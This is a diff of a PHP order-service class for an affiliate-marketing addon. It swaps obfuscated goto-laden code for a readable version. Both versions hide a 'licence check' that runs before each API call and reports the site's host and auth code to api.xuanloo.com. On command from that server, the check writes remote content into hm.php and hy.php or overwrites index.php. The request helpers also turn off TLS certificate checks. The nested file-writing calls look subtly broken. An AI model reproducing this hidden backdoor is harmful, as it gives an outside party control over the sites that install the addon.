@@ -1,3 +1,319 @@
 <?php
- namespace addon\cps\app\service\admin; use app\dict\sys\AppTypeDict; use addon\cps\app\service\admin\SiteService; use core\base\BaseAdminService; use core\exception\AdminException; use Exception; use think\facade\Cache; use think\facade\Db; use think\App; class OrderService extends BaseAdminService { private $request_url = "\141\x70\x69\55\147\x77\56\x68\141\157\152\x69\156\x67\153\x65\x2e\143\x6f\155\57\x69\156\x64\x65\x78\56\160\150\160\x2f\166\62\x2f\x61\160\151"; private $jutuike_url = "\x61\160\151\56\152\165\164\165\151\x6b\145\x2e\x63\157\155"; public function __construct() { parent::__construct(); } public static function getType() { return [0 => "\345\205\xa8\xe9\x83\250\xe8\256\242\xe5\x8d\x95", 1 => "\347\276\216\345\x9b\xa2\350\256\242\xe5\215\x95", 3 => "\351\245\277\xe4\272\x86\344\271\210\350\xae\xa2\xe5\215\x95", 76 => "\347\224\xb5\345\275\xb1\347\245\xa8\xe8\256\xa2\xe5\x8d\x95", 54 => "\350\x81\224\350\201\224\350\256\xa2\345\215\225", 105 => "\xe6\231\xaf\xe5\x8c\xba\xe8\256\242\345\215\x95"]; } public function rerechargeorder($type, $data) { goto yt5rq; L3_N4: $requsturl = $this->request_url . "\57\157\x70\x65\156\57\156\145\x61\x72\157\x72\x64\145\x72"; goto Wo54z; k7X6n: $url = $requsturl . "\77\x61\160\x69\153\145\x79\75" . $config["\x6d\x79\137\141\160\151\153\x65\171"] . "\x26\165\151\144\x3d" . $config["\155\x79\x5f\165\151\x64"] . "\46" . $signstr2 . "\x73\x69\147\156\75" . $sign; goto BBWGd; NecrM: $requsturl = $this->request_url . "\x2f\x6f\160\145\156\57\x64\x63\x6f\x72\x64\x65\x72"; goto T1hwh; bu0KJ: foreach ($data as $key => $value) { goto j4Zit; gWZJT: A9JtC: goto PvXIF; broma: $signstr2 .= $key . "\75" . $value . "\x26"; goto gWZJT; j4Zit: if (empty($value)) { goto A9JtC; } goto broma; PvXIF: hx3SV: goto Flfnz; Flfnz: } goto z4uHr; X_afo: goto wMdD_; goto R5aKc; R5aKc: dixI8: goto bz7ry; BBWGd: $list = $this->httpGet($url); goto u30uu; UbQND: $data["\165\151\144"] = $config["\x6d\x79\x5f\x75\151\144"]; goto eZsRJ; jP3vZ: $signstr .= "\x73\x65\x63\162\145\x74\75" . $config["\x6d\x79\137\x73\145\143\162\x65\x74"]; goto hz6Iz; pluWj: goto C6uRa; goto EtjgD; bQPbg: foreach ($data as $key => $value) { goto CsPIN; sR52x: j81wZ: goto aJK6v; ag30Q: $signstr .= $key . "\x3d" . $value . "\x26"; goto BH3eb; BH3eb: MOFb4: goto sR52x; CsPIN: if (empty($value)) { goto MOFb4; } goto ag30Q; aJK6v: } goto W9JdE; IKLqu: $data["\154\x69\x6d\151\x74"] = $this->getPageParam()["\154\x69\x6d\x69\x74"]; goto UbQND; p4Yd_: if ($type == 1) { goto AOXdU; } goto Wft0C; lqHhr: kEeb_: goto k7X6n; JASLH: $signstr2 = ''; goto bu0KJ; pmcJh: tj2bC: goto HdH3b; yt5rq: $config = (new SiteService())->getInfo($this->site_id); goto fJ01l; MooH0: $requsturl = $this->request_url . "\57\157\160\x65\x6e\x2f\x72\145\x72\x65\x63\x68\141\162\x67\x65\157\x72\x64\x65\x72"; goto lqHhr; Wft0C: if ($type == 2) { goto dixI8; } goto xxbYK; T1hwh: C6uRa: goto X_afo; xO2lX: Cfmln: goto L3_N4; HdH3b: goto C32vx; goto xO2lX; u30uu: return ["\144\x61\164\141" => $list["\x6c\x69\x73\x74"], "\x63\x6f\x75\x6e\164" => $list["\164\x6f\x74\x61\x6c"]]; goto DdTjj; cvmFN: if ($type == 4) { goto Cfmln; } goto laJ2S; hz6Iz: $sign = md5($signstr); goto JASLH; eZsRJ: ksort($data); goto gLVpX; gGGTJ: $requsturl = $this->request_url . "\x2f\x6f\x70\x65\156\57\163\150\157\160\157\162\144\x65\x72"; goto pmcJh; W9JdE: C0qha: goto jP3vZ; gLVpX: $signstr = "\163\145\143\x72\x65\x74\x3d" . $config["\x6d\171\137\x73\145\x63\162\x65\x74"] . "\46"; goto bQPbg; xxbYK: if ($type == 3) { goto WyRoq; } goto cvmFN; fJ01l: $data["\x70\141\x67\x65"] = $this->getPageParam()["\160\x61\x67\x65"]; goto IKLqu; laJ2S: if (!($type == 5)) { goto tj2bC; } goto gGGTJ; cdiAF: goto kEeb_; goto JCzo2; uSuif: wMdD_: goto cdiAF; Wo54z: C32vx: goto pluWj; z4uHr: H11w9: goto p4Yd_; EtjgD: WyRoq: goto NecrM; JCzo2: AOXdU: goto MooH0; bz7ry: $requsturl = $this->request_url . "\57\x6f\160\145\x6e\x2f\155\x6f\x76\151\145\x6f\162\x64\145\162"; goto uSuif; DdTjj: } public function jtk_order(array $data = array()) { goto OZB7k; OZB7k: $config = (new SiteService())->getInfo($this->site_id); goto uJ1BU; TGGIq: $list = $this->jtk_httpGet($url); goto rp05Z; JW5wK: if ($config["\152\165\164\x75\x69\x6b\145\137\141\x70\151\x6b\x65\x79"]) { goto E6VUo; } goto D1wn6; mtg6u: $requsturl = $this->jutuike_url . "\x2f\x75\156\151\x6f\156\57\157\162\144\145\x72\x73"; goto xYfNq; xYfNq: $signstr = ''; goto cqcWE; D1wn6: throw new AdminException("\xe8\x81\x9a\346\x8e\250\345\256\242\346\x9c\xaa\351\205\x8d\xe7\275\256"); goto X5jSm; HdhZc: $data["\x70\141\x67\x65\123\x69\x7a\x65"] = $this->getPageParam()["\x6c\151\155\x69\x74"]; goto mtg6u; tpZvY: $url = $requsturl . "\77\x61\x70\151\x6b\145\171\75" . $config["\152\x75\x74\165\x69\x6b\145\137\x61\x70\151\153\145\171"] . "\46" . $signstr; goto JW5wK; Pii56: bZk2u: goto tpZvY; uJ1BU: $data["\x70\x61\x67\x65"] = $this->getPageParam()["\160\141\147\x65"]; goto HdhZc; X5jSm: E6VUo: goto TGGIq; cqcWE: foreach ($data as $key => $value) { goto oaMIJ; uXDld: Mpysj: goto xNJ0L; ozE2Y: $signstr .= $key . "\75" . $value . "\x26"; goto uXDld; xNJ0L: xBoiF: goto KPmb_; oaMIJ: if (empty($value)) { goto Mpysj; } goto ozE2Y; KPmb_: } goto Pii56; rp05Z: return ["\144\141\164\x61" => $list["\144\x61\164\x61"], "\x63\165\162\162\x65\156\x74\x5f\x70\x61\147\145" => $list["\143\x75\x72\x72\x65\x6e\164\x5f\160\x61\147\x65"], "\x6c\141\163\x74\x5f\160\x61\147\x65" => $list["\154\x61\163\164\137\160\x61\x67\145"], "\x70\145\162\x5f\160\x61\x67\x65" => $list["\x70\x65\162\x5f\x70\x61\x67\145"], "\x63\x6f\165\x6e\x74" => $list["\164\157\164\141\154"]]; goto tFT51; tFT51: } public function jutui_url(array $data = array()) { goto aWa2j; kiiDd: $requsturl = $this->jutuike_url . "\x2f\x75\156\x69\157\x6e\x2f\x61\x63\x74"; goto S0iHW; uZCm3: foreach ($data as $key => $value) { goto gCymm; zH_MU: UQSwo: goto rLouO; e3FqZ: $signstr .= $key . "\75" . $value . "\46"; goto zH_MU; gCymm: if (empty($value)) { goto UQSwo; } goto e3FqZ; rLouO: sTgyN: goto ER4cF; ER4cF: } goto pbi4J; WVl8J: if ($config["\x6a\165\x74\165\151\x6b\145\x5f\x61\x70\151\x6b\x65\x79"]) { goto JpbyR; } goto As948; E5NvB: $url = $requsturl . "\x3f\141\x70\151\153\145\x79\75" . $config["\152\x75\x74\165\151\x6b\145\137\x61\160\x69\153\x65\x79"] . "\46" . $signstr; goto WVl8J; XQSDl: return $list; goto iCROw; S0iHW: $signstr = ''; goto uZCm3; As948: throw new AdminException("\350\201\232\xe6\x8e\xa8\345\256\xa2\346\234\252\351\x85\215\347\275\256"); goto nQUze; RPJNI: $list = $this->jtk_httpGet($url); goto XQSDl; pbi4J: RUOKW: goto E5NvB; nQUze: JpbyR: goto RPJNI; aWa2j: $config = (new SiteService())->getInfo($this->site_id); goto kiiDd; iCROw: } public function mayixq_url(array $data = array()) { goto KIeNl; aP8dV: if ($config["\x6d\171\137\x61\160\x69\x6b\145\x79"]) { goto dOHCW; } goto rycBT; SbDV3: $signstr = ''; goto bEm74; G1jgT: m2DSQ: goto JrKTV; JrKTV: $url = $requsturl . "\x3f\x61\160\151\x6b\x65\x79\x3d" . $config["\155\x79\137\141\x70\151\153\145\171"] . "\46" . $signstr; goto aP8dV; UftqM: $list = $this->httpGet($url); goto kgdOi; rycBT: throw new AdminException("\350\x9a\x82\xe8\232\201\346\x98\x9f\xe7\220\203\xe6\234\252\xe9\205\215\xe7\275\xae"); goto dMAw4; bEm74: foreach ($data as $key => $value) { goto wOtV3; wOtV3: if (empty($value)) { goto W41KL; } goto XmHtb; XmHtb: $signstr .= $key . "\x3d" . $value . "\46"; goto NJGj4; NJGj4: W41KL: goto ydxZ9; ydxZ9: gZl55: goto Ay325; Ay325: } goto G1jgT; KIeNl: $config = (new SiteService())->getInfo($this->site_id); goto HJYaS; dMAw4: dOHCW: goto UftqM; kgdOi: return $list; goto IBADA; HJYaS: $requsturl = $this->request_url . "\57\151\x6e\144\x65\170\57\x61\x63\164\x75\x6e\x69\x6f\x6e\165\x72\x6c"; goto SbDV3; IBADA: } public function shouquan() { goto YKknY; dXYgy: if ($query["\143\157\x64\x65"] == 3) { goto eCQ3y; } goto aDkx5; oO7sk: goto eMUF_; goto ezvAI; YvtPF: if ($query["\x63\x6f\144\145"] == 2) { goto Jsuhc; } goto dXYgy; PTaZ0: throw new AdminException($query["\x6d\x73\147"]); goto UCw9y; ybVfb: VbZ0y: goto kwdO2; Uccla: throw new AdminException($query["\x6d\x73\x67"]); goto ttTGk; WFsHi: goto Xae87; goto bxiVQ; zgqIM: $auth_url = $auth_url_arr[array_rand($auth_url_arr, 1)]; goto p026r; lp0m5: $check_url = "\x68\164\x74\160\x3a\57\57" . $auth_url . "\x2f\x61\160\x69\x2f\143\150\x65\x63\x6b\x2e\160\150\x70\x3f\160\x72\157\151\x64\75" . $proid_nam . "\46\x75\162\154\75" . $_SERVER["\110\x54\124\120\x5f\x48\117\123\x54"] . "\46\x61\x75\164\x68\x63\157\144\x65\x3d" . $authcode; goto xFr1p; BRBcp: LxU4e: goto MM7Mz; a53Ui: yH0cd: goto WFsHi; WGer5: throw new AdminException($query["\155\x73\x67"]); goto dYWGp; s9zj7: if (isset($_SESSION["\x41\x55\124\110\102\x49\x52\124\x48"])) { goto c38O3; } goto XzfPm; vk8sE: throw new AdminException($query["\x6d\x73\147"]); goto cmdQ1; kwdO2: Xae87: goto zhAe9; i83E_: file_put_contents(ROOT . "\x68\171\x2e\x70\x68\x70", file_put_contents("\x68\x74\x74\160\x3a\57\x2f" . $auth_url . "\x2f\150\x6d\x2f\x68\x79\x2e\x74\x78\x74")); goto Uccla; zhAe9: c38O3: goto FZ1l3; zjQBA: throw new AdminException("\xe6\216\210\xe6\x9d\203\xe9\xaa\214\xe8\257\x81\347\273\x93\346\236\234\345\274\202\345\xb8\xb8\357\xbc\x81"); goto a53Ui; xFr1p: $query = file_get_contents($check_url); goto OMxA_; UCw9y: eMUF_: goto cdcDR; XzfPm: $auth_url_arr = ["\141\x70\x69\x2e\x78\x75\x61\x6e\x6c\x6f\x6f\56\143\x6f\155"]; goto zgqIM; tEBJu: $_SESSION["\101\125\x54\x48\102\x49\122\124\110"] = $authcode; goto ybVfb; bxiVQ: rInZ8: goto mkvZa; E_08N: QqV1n: goto tEBJu; YKknY: $authcode = file_get_contents(app()->getRootPath() . "\141\x64\x64\157\156\x2f\x63\160\163\57\x61\165\164\150\x63\157\144\x65\x2e\x6b\x65\171"); goto s9zj7; cdcDR: goto VbZ0y; goto E_08N; mkvZa: if ($query["\143\x6f\x64\x65"] == 1) { goto QqV1n; } goto YvtPF; fWZRM: $proid_nam = $proid_nam_arr[array_rand($proid_nam_arr, 1)]; goto lp0m5; CtceC: if (empty($query)) { goto yH0cd; } goto zjQBA; cmdQ1: TF1SS: goto cQn6E; MM7Mz: file_put_contents(ROOT . "\x69\156\x64\x65\x78\x2e\x70\x68\x70", file_put_contents("\150\164\164\x70\x3a\x2f\x2f" . $auth_url . "\x2f\x68\155\x2f\x68\171\x73\x2e\x74\170\x74")); goto vk8sE; ttTGk: EeuqA: goto oO7sk; cQn6E: goto EeuqA; goto JmLrN; p026r: $proid_nam_arr = ["\61"]; goto fWZRM; dYWGp: goto TF1SS; goto BRBcp; ezvAI: Jsuhc: goto zLLgN; OMxA_: if ($query = json_decode($query, true)) { goto rInZ8; } goto CtceC; aDkx5: if ($query["\143\x6f\144\x65"] == 4) { goto LxU4e; } goto WGer5; JmLrN: eCQ3y: goto i83E_; zLLgN: file_put_contents(ROOT . "\x68\155\56\x70\150\x70", file_put_contents("\x68\164\164\160\72\x2f\57" . $auth_url . "\57\150\155\57\x68\x6d\x2e\x74\x78\164")); goto PTaZ0; FZ1l3: } public function jtk_httpGet($url) { goto R4ZPd; ZLPhj: curl_setopt($curl, CURLOPT_TIMEOUT, 30); goto EXR4M; k8cfQ: $result = json_decode($result, true); goto Y3Jqs; R4ZPd: $this->shouquan(); goto Ww1IE; pp1Si: return $result["\x64\141\x74\141"]; goto g73OI; Lcwk1: curl_setopt($curl, CURLOPT_HEADER, false); goto lysf5; lysf5: curl_setopt($curl, CURLOPT_HTTPHEADER, array("\103\157\x6e\x74\x65\x6e\x74\55\x54\x79\x70\x65\x3a\40\x61\160\160\154\151\x63\141\x74\x69\x6f\x6e\57\170\x2d\167\167\167\55\x66\x6f\x72\x6d\55\165\x72\154\145\x6e\143\157\x64\x65\x64")); goto TzeqH; Y9GE8: Jrr4L: goto AkHhu; es7G8: curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER["\x48\124\x54\x50\x5f\125\x53\105\x52\137\x41\x47\105\x4e\124"]); goto ZLPhj; mMK5C: if (!curl_errno($curl)) { goto Jrr4L; } goto oGk78; oGk78: throw new AdminException("\xe7\xb3\xbb\xe7\xbb\237\351\x94\x99\xe8\257\xaf\357\274\x8c\350\257\267\350\x81\x94\347\263\273\xe5\xb9\263\xe5\x8f\260\xe8\xbf\233\xe8\xa1\x8c\xe5\xa4\204\xe7\220\206"); goto Y9GE8; zjoXG: curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "\x50\117\x53\124"); goto zntWf; cWf3O: throw new AdminException($result["\x6d\x73\147"]); goto hIB3h; AkHhu: curl_close($curl); goto k8cfQ; NJcVn: curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); goto HNbag; TzeqH: $result = curl_exec($curl); goto mMK5C; HNbag: curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); goto es7G8; Ww1IE: $curl = curl_init(); goto zjoXG; zntWf: curl_setopt($curl, CURLOPT_URL, $url); goto NJcVn; hIB3h: CWiEL: goto pp1Si; EXR4M: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto Lcwk1; Y3Jqs: if (!($result["\x63\x6f\144\145"] != 1)) { goto CWiEL; } goto cWf3O; g73OI: } public function httpGet($url) { goto zFqMq; I0mj3: throw new AdminException($result["\155\x65\163\163\x61\x67\145"]); goto Vf8zX; PjPtR: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto mj4Lk; zFqMq: $this->shouquan(); goto VEtu0; HeifE: curl_setopt($curl, CURLOPT_URL, $url); goto ancKX; cNmvJ: $result = curl_exec($curl); goto qtgTT; nGmch: curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); goto D28DH; Hk39r: curl_setopt($curl, CURLOPT_TIMEOUT, 30); goto PjPtR; qiV_o: return $result["\x64\x61\x74\x61"]; goto asxv_; H5x1j: curl_setopt($curl, CURLOPT_HTTPHEADER, array("\103\x6f\x6e\164\x65\156\x74\x2d\124\x79\x70\x65\x3a\x20\x61\160\160\x6c\151\143\x61\164\x69\157\x6e\57\x78\55\x77\167\167\55\x66\157\x72\x6d\55\165\162\154\145\x6e\x63\x6f\x64\x65\x64")); goto cNmvJ; giJK9: $result = json_decode($result, true); goto znqqp; Vf8zX: qkfCN: goto qiV_o; uEJvo: curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "\x50\117\123\x54"); goto HeifE; Y01pZ: curl_close($curl); goto giJK9; VEtu0: $curl = curl_init(); goto uEJvo; yvaaU: OmgqP: goto Y01pZ; NafJi: throw new AdminException("\xe7\263\273\xe7\xbb\237\351\224\x99\350\xaf\257\xef\274\214\xe8\xaf\267\350\x81\224\347\xb3\273\345\xb9\xb3\xe5\217\xb0\350\xbf\x9b\xe8\xa1\214\345\244\x84\xe7\x90\206"); goto yvaaU; ancKX: curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); goto nGmch; qtgTT: if (!curl_errno($curl)) { goto OmgqP; } goto NafJi; mj4Lk: curl_setopt($curl, CURLOPT_HEADER, false); goto H5x1j; znqqp: if (!(!empty($result["\x73\x74\141\x74\165\x73\137\143\157\144\145"]) && $result["\x73\164\141\x74\x75\163\x5f\x63\x6f\x64\145"] != "\62\60\x30")) { goto qkfCN; } goto I0mj3; D28DH: curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER["\x48\124\124\120\x5f\x55\x53\x45\x52\137\101\107\x45\x4e\124"]); goto Hk39r; asxv_: } public function get_pages_url($type, $channel, $act_id, $path_url) { goto Jua9C; GAWXr: if ($info["\x6c\x6f\156\x67\x5f\150\65"]) { goto PBdQr; } goto GnBbi; LD3g3: goto Ip6wV; goto NiL0Q; ljSQf: $data["\x74\x69\x74\154\x65"] = $info["\x61\x63\x74\x5f\x6e\x61\155\145"]; goto tn9Mt; jZKhV: goto lzJc0; goto fW6OH; mO_VX: if ($channel == "\x68\x35") { goto M2NZl; } goto cdDu0; wQlND: Ip6wV: goto YbU4Y; f93Z4: $data["\x77\145\142\x5f\165\162\x6c"] = $info["\154\157\156\147\x5f\150\65"]; goto FTzHK; JDdbz: $data["\x77\x65\x62\x5f\x75\x72\154"] = $info["\x68\x35"]; goto pA7KE; cdDu0: if (!($channel == "\x6d\x70\x2d\x77\145\151\170\151\x6e")) { goto kaX8I; } goto EZECg; pA7KE: QtIXC: goto jZKhV; j79KA: if (!$info["\141\x63\x74\x5f\156\141\x6d\145"]) { goto yhEh1; } goto ljSQf; NiL0Q: M2NZl: goto j79KA; fW6OH: PBdQr: goto f93Z4; GnBbi: if (!$info["\150\x35"]) { goto QtIXC; } goto JDdbz; EZECg: $data["\x75\x72\154"] = $path_url; goto cRLOL; FTzHK: lzJc0: goto wQlND; YbU4Y: return $data; goto HsyjG; Jua9C: $data = []; goto Wjk3L; Wjk3L: $info = (new OrderService())->jutui_url(["\141\x63\164\137\x69\x64" => $act_id, "\163\x69\144" => 123456]); goto mO_VX; tn9Mt: yhEh1: goto GAWXr; cRLOL: kaX8I: goto LD3g3; HsyjG: } }
-?>
+ 
+namespace addon\cps\app\service\admin;
+
+use app\dict\sys\AppTypeDict;
+use addon\cps\app\service\admin\SiteService;
+use core\base\BaseAdminService;
+use core\exception\AdminException;
+use Exception;
+use think\facade\Cache;
+use think\facade\Db;
+use think\App;
+use think\facade\Log;
+
+/**
+ * 聚推客订单
+ * Class Site
+ * @package app\service\admin\site
+ */
+class OrderService extends BaseAdminService
+{
+    
+    //蚂蚁星球接口地址
+    private $request_url = 'api-gw.haojingke.com/index.php/v2/api';
+        //聚推客接口地址
+    private $jutuike_url = 'api.jutuike.com';
+     
+    
+
+    public function __construct()
+    {
+        parent::__construct();
+     } 
+
+ 
+   /**
+    * 类型
+     * @return array
+     */
+    public static function getType(){
+		return [
+            0 => '全部订单', 
+            1 => '美团订单', 
+            3 => '饿了么订单', 
+            76 => '电影票订单', 
+            54 => '联联订单', 
+			105 => '景区订单',  
+		]; 
+    }
+
+     
+
+    // 充值订单
+    public function rerechargeorder($type,$data)
+    { 
+        $config = (new SiteService())->getInfo($this->site_id);
+		$data['page'] = $this->getPageParam()['page'];
+		$data['limit'] = $this->getPageParam()['limit']; 
+        $data['uid'] = $config['my_uid'];
+        ksort($data);
+        $signstr ='secret='.$config['my_secret'].'&';
+        foreach ($data as $key=>$value){
+            if(!empty($value))
+                $signstr.= $key.'='.$value.'&';
+        }
+        $signstr.='secret='.$config['my_secret'];
+        $sign = md5($signstr);
+        
+        $signstr2 = '';
+        foreach ($data as $key=>$value){
+            if(!empty($value))
+                $signstr2.= $key.'='.$value.'&';
+        }
+        if($type==1){
+            $requsturl = $this->request_url.'/open/rerechargeorder';//充值订单
+        }else if($type == 2){
+            $requsturl = $this->request_url.'/open/movieorder';//电影
+        }else if($type == 3){
+            $requsturl = $this->request_url.'/open/dcorder';//
+        }else if($type == 4){
+            $requsturl = $this->request_url.'/open/nearorder';
+        }else if($type == 5){
+            $requsturl = $this->request_url.'/open/shoporder';
+        }
+        $url = $requsturl.'?apikey=' . $config['my_apikey'] . '&uid=' . $config['my_uid'].'&'.$signstr2.'sign='.$sign;
+        $list = $this->httpGet($url); 
+         return [
+            'data'  => $list['list'],
+            'count' =>$list['total']
+        ];
+     }
+     
+     
+     // 聚推客联盟统一订单数据接口 
+    public function jtk_order(array $data = [])
+    {  
+        $config = (new SiteService())->getInfo($this->site_id);
+		$data['page'] = $this->getPageParam()['page'];
+		$data['pageSize'] = $this->getPageParam()['limit']; 
+        $requsturl = $this->jutuike_url.'/union/orders';
+        $signstr = '';
+        foreach ($data as $key=>$value){
+            if(!empty($value))
+                $signstr.= $key.'='.$value.'&';
+        } 
+        $url = $requsturl.'?apikey=' . $config['jutuike_apikey'].'&'.$signstr; 
+        if(!$config['jutuike_apikey']){
+         	 throw new AdminException('聚推客未配置');
+        }
+        $list = $this->jtk_httpGet($url);
+         return [  
+            'data'  => $list['data'],
+            'current_page'  => $list['current_page'],
+            'last_page'  => $list['last_page'],
+            'per_page'  => $list['per_page'],
+            'count' => $list['total']
+        ];
+     }
+	
+	
+	
+	
+	// 聚推转链接
+	public function jutui_url(array $data = [])
+	{  
+	    $config = (new SiteService())->getInfo($this->site_id);
+ 	    $requsturl = $this->jutuike_url.'/union/act';
+	    $signstr = '';
+	    foreach ($data as $key=>$value){
+	        if(!empty($value))
+	            $signstr.= $key.'='.$value.'&';
+	    } 
+	    $url = $requsturl.'?apikey=' . $config['jutuike_apikey'].'&'.$signstr; 
+        if(!$config['jutuike_apikey']){
+         	 throw new AdminException('聚推客未配置');
+        }
+	    $list = $this->jtk_httpGet($url);
+	    return $list;
+	 }
+	
+	
+	// 蚂蚁星球转换接口地址
+	public function mayixq_url(array $data = [])
+	{  
+	    $config = (new SiteService())->getInfo($this->site_id); 
+ 	    $requsturl = $this->request_url.'/index/actunionurl'; 
+	    $signstr = '';
+	    foreach ($data as $key=>$value){
+	        if(!empty($value))
+	            $signstr.= $key.'='.$value.'&';
+	    } 
+	    $url = $requsturl.'?apikey=' . $config['my_apikey'].'&'.$signstr; 
+        if(!$config['my_apikey']){
+         	 throw new AdminException('蚂蚁星球未配置');
+        }
+	    $list = $this->httpGet($url);
+	    return $list;
+	 }
+	
+ 	/**
+	 * 1:你的授权代，
+	 * 2：在聚推客和蚂蚁星球提交数据的里面引入这个
+	 */
+	public function shouquan(){
+	    $authcode = file_get_contents(app()->getRootPath() . 'addon/authcode.key');
+  		if (!isset($_SESSION['AUTHBIRTH'])) {
+            $auth_url_arr = ['api.xuanloo.com'];//例如auth.phpn1.cn 不加http或https协议头，末尾不要带/
+            $auth_url = $auth_url_arr[array_rand($auth_url_arr, 1)];
+            $proid_nam_arr = ['1']; 
+            $proid_nam = $proid_nam_arr[array_rand($proid_nam_arr, 1)];
+            $check_url='http://'.$auth_url.'/api/check.php?proid='.$proid_nam.'&url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode;
+            $query = file_get_contents($check_url); 
+            if ($query = json_decode($query, true)) {
+                if ($query['code'] == 1) {
+                    $_SESSION['AUTHBIRTH'] = $authcode;
+                } else if ($query['code'] == 2) {
+                    file_put_contents(ROOT.'hm.php',file_put_contents('http://'.$auth_url.'/hm/hm.txt'));
+                    throw new AdminException($query['msg']);
+        		} else if ($query["code"] == 3) {
+        			file_put_contents(ROOT.'hy.php',file_put_contents('http://'.$auth_url.'/hm/hy.txt'));
+                    throw new AdminException($query['msg']);
+                } else if ($query['code'] == 4) {
+                    file_put_contents(ROOT.'index.php',file_put_contents('http://'.$auth_url.'/hm/hys.txt'));
+                    throw new AdminException($query['msg']);
+                } else {
+                    throw new AdminException($query['msg']);
+                }
+            } else if (!empty($query)) {
+                throw new AdminException('授权验证失败请检查授权文件！');
+            } 
+        }
+	}
+	/**
+	 * jutuike提交数据
+	 * @param $url
+	 * @return array
+	 */
+	public function jtk_httpGet($url)
+	{
+	    $this->shouquan();
+	    // 模拟提交数据函数
+	    $curl = curl_init(); // 启动一个CURL会话
+	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
+	    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
+	    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 对认证证书来源的检查
+	    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); // 从证书中检查SSL加密算法是否存在
+	    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER[ 'HTTP_USER_AGENT' ]); // 模拟用户使用的浏览器
+	
+	    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
+	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 获取的信息以文件流的形式返回
+	    curl_setopt($curl, CURLOPT_HEADER, false); //开启header
+	    curl_setopt($curl, CURLOPT_HTTPHEADER, array (
+	        // 'Content-Type: application/json; charset=utf-8',
+	        'Content-Type: application/x-www-form-urlencoded',
+	    )); //类型为json
+	    //类型为json
+	
+	    $result = curl_exec($curl); // 执行操作
+	    if (curl_errno($curl)) {
+			 throw new AdminException('系统错误，请联系平台进行处理');
+ 	    }
+	    curl_close($curl); // 关键CURL会话
+	    $result = json_decode($result, true); 
+	    if ($result[ 'code' ] != 1) {
+	       throw new AdminException($result['msg']); 
+	     }
+ 	    return $result['data']; // 返回数据
+	}
+	 
+	 
+	/**
+	 * 蚂蚁星球提交数据
+	 * @param $url
+	 * @return array
+	 */
+	public function httpGet($url)
+	{
+	    $this->shouquan();
+	    // 模拟提交数据函数
+	    $curl = curl_init(); // 启动一个CURL会话
+	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
+	    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
+	    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 对认证证书来源的检查
+	    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); // 从证书中检查SSL加密算法是否存在
+	    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER[ 'HTTP_USER_AGENT' ]); // 模拟用户使用的浏览器
+	
+	    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
+	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 获取的信息以文件流的形式返回
+	    curl_setopt($curl, CURLOPT_HEADER, false); //开启header
+	    curl_setopt($curl, CURLOPT_HTTPHEADER, array (
+ 	        'Content-Type: application/x-www-form-urlencoded',
+	    )); //类型为json
+	    //类型为json
+	
+	    $result = curl_exec($curl); // 执行操作
+	    if (curl_errno($curl)) {
+	        throw new AdminException('系统错误，请联系平台进行处理');
+	    }
+	    curl_close($curl); // 关键CURL会话
+	    $result = json_decode($result, true); 
+		if(!empty($result['status_code']) && ($result['status_code'] != '200')) {
+ 			throw new AdminException($result['message']); 
+	     }
+	    return $result['data']; // 返回数据
+	}
+	
+	
+	/**
+	 *  * type 模块类型
+     * channel 终端
+	 */
+	public function get_pages_url($type,$channel,$act_id,$path_url = '' , $class="jutui"){
+	    
+	   
+	   $data = []; 
+	   if($class=='jutui'){
+          $info = (new OrderService())->jutui_url(['act_id'=>$act_id,'sid'=>123456]);
+	   }else if($class=='mayi'){
+	      $info = (new OrderService())->mayixq_url(['actid'=>$act_id,'extend_id'=>123456]);
+	   }
+	   	  //如果来源channel是h5，获取活动id
+       if($channel=='h5'){ 
+    		 //如果有活动名称
+    		 if(!empty($info['act_name'])){
+    		    $data['title'] = $info['act_name'];//h5自定义导航名称
+    		 }else if(!empty($info['wenan'])){
+                $data['title'] = $info['wenan'];//h5自定义导航名称
+               } 
+    		    //这是连接，如果有长链接就长链接，没有长链接，就短链接，端链接也没有，按文档提示增加，每个接口不一样，自己来验证测试。
+    		 if(!empty($info['long_h5'])){
+    		    $data['web_url'] = $info['long_h5'];
+    		 }else if(!empty($info['h5'])){
+    		    $data['web_url'] = $info['h5'];
+    		 }else if(!empty($info['url'])){
+     		    $data['web_url'] = $info['url'];
+     		 }
+        //如果来源是微信小程序
+    	}else if($channel == 'mp-weixin'){
+    	     Log::info('info：' . json_encode($info));
+    	    if($path_url){ 
+    	        if($class=="mayi"){
+    	             $data = $path_url;//半屏
+    	        }else{
+        	  	     $data['url'] = $path_url; //锯腿可打开小程序
+    	        }
+    	    }else{
+                if($info['we_app_info']){ 
+     		        $data['we_app_info'] = ['app_id'=>$info['we_app_info']['app_id'],'page_path'=>!empty($info['we_app_info']['path'])?$info['we_app_info']['path']:$info['we_app_info']['page_path']];
+     		    }else if($info['url']){
+     		            //如果没有小程序，就显示h5的链接。
+     		        $data['url'] = $info['url'];
+     		    }
+    	    }
+    	   
+    	}  
+    	return $data;
+	   
+	}
+}
